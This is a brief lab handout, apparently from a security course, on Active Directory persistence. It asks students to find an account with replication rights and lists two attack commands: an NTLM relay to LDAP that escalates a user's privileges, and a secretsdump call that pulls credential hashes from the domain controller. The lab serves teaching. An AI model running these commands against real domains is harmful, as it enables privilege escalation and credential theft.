# Lab4_Persistence
- Who has replication right?
- Find its vulnerability and expolit it
- Some command you may need:
    - sudo python ntlmrelayx.py -t ldap://10.0.0.4 --escalate-user \<account\>
    - sudo python secretsdump.py hackcollege/\<account\>:\<passwd\>@10.0.0.4 -just-dc
